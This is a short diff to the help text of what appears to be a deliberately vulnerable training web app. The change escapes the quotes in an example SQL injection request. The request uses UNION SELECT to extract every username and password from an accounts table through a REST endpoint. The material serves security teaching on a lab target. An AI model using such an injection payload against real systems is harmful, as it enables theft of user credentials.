@@ -217,7 +217,7 @@ username=john&password=newpass123
 <h4>Example Exploits (SQL Injection)</h4>
 <p>This service is vulnerable to SQL injection at security level 0. Example:</p>
 <pre>
-GET /webservices/rest/ws-user-account.php?username=jeremy'+union+select+concat('The+password+for+',username,'+is+',password),mysignature+from+accounts+-- HTTP/1.1
+GET /webservices/rest/ws-user-account.php?username=jeremy\'+union+select+concat(\'The+password+for+\',username,\'+is+\',password),mysignature+from+accounts+-- HTTP/1.1
 Host: mutillidae.localhost
 </pre>
 
